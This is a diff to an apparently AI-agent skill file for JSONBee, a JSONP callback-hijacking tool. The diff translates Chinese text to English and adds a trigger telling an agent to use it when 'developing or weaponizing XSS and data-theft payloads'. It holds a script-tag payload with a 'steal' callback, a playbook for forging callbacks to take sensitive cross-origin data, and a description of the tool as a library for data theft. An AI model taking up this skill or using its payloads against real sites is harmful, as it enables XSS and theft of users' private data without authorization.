@@ -2,37 +2,39 @@
 name: jsonbee-jsonp-harvest
 description: "JSONBee hijacks JSONP callbacks. Signals: payload development, weaponization, usable JSONP endpoints, XSS or data theft, curated endpoints."
 zh-signals: "JSONBee: JSONP 回调劫持。信号:载荷开发,武器化,挑可用 JSONP 端点,XSS/数据窃取,预整理端点。"
+when-to-use: >-
+  Use when developing or weaponizing XSS and data-theft payloads that need a working JSONP endpoint with a controllable callback to leak cross-origin data.
 ---
 
 # JSONBee
 
-- 攻击大类:C07 载荷与文件投递
-- 上游仓库:https://github.com/zigoo0/JSONBee
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C07 Payload and File Delivery
+- Upstream Repository: https://github.com/zigoo0/JSONBee
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/zigoo0/JSONBee
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `grep -h 'google' *.txt` | 挑可用 JSONP 端点 |
-| `组合 payload: <script src='https://victim.com/jsonp?callback=steal'></script>` | XSS/数据窃取 |
-| `cc理想.jsonp 文件批量看` | 预整理端点 |
+| `grep -h 'google' *.txt` | Pick usable JSONP endpoints |
+| `Combined payload: <script src='https://victim.com/jsonp?callback=steal'></script>` | XSS / data theft |
+| `cc-ideal.jsonp file, view in bulk` | Curated endpoints |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### JSONP 回调劫持
+### JSONP Callback Hijacking
 
 ```bash
-cat cc理想.jsonp | head
-# 找含敏感数据的 JSONP 端点,伪造回调函数窃取
+cat cc-ideal.jsonp | head
+# Find JSONP endpoints holding sensitive data and forge the callback function to steal it
 ```
 
-## 注意事项
+## Notes
 
-JSONP 端点收集(google/github/默认回调等),XSS 和跨域数据窃取素材库。
+A collection of JSONP endpoints (google/github/default callbacks, etc.), a resource library for XSS and cross-origin data theft.
